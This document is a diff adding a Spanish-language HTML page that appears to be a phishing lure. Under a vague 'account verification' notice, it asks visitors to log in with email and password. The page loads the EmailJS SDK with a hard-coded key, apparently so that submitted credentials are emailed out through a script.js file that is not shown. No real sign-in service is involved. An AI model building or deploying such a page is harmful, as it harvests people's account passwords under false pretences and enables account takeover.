@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirigiendo.....</title>
+  <link rel="stylesheet" href="style.css">
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("LquKVuW5a7CwCUFXD"); // your EmailJS public key
+    })();
+  </script>
+</head>
+<body>
+  <div class="page">
+    
+    <!-- Notice Panel -->
+    <div class="panel notice">
+      <div class="notice-inner">
+        <h2 class="notice-title">Verificación de cuenta</h2>
+        <p class="notice-sub">Por favor, inicie sesión para continuar.</p>
+        <a href="#" class="primary-btn">Más información</a>
+      </div>
+
+      <!-- Square image -->
+      <div class="notice-graphic">
+        <img src="download (1).png" alt="Decorative">
+      </div>
+    </div>
+
+    <!-- Form Panel -->
+    <div class="panel form-panel">
+      <form id="login-form" class="form-card">
+        <h3 class="form-title">Iniciar sesión</h3>
+        <p class="form-desc">Introduzca sus datos a continuación:</p>
+
+        <div class="field">
+          <label class="label-text">Email</label>
+          <input type="email" name="user_email" placeholder="correo electrónico" required />
+        </div>
+
+        <div class="field password-field">
+          <label class="label-text">contraseña</label>
+          <input type="password" name="username" id="password" placeholder="contraseña" required />
+          <button type="button" id="toggle-password">👁</button>
+        </div>
+
+        <div class="actions">
+          <input type="submit" id="button" value="Enviar" class="primary-btn">
+          <button type="button" class="link-btn">Necesita ayuda?</button>
+        </div>
+
+        <p id="status" class="status"></p>
+      </form>
+    </div>
+
+  
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
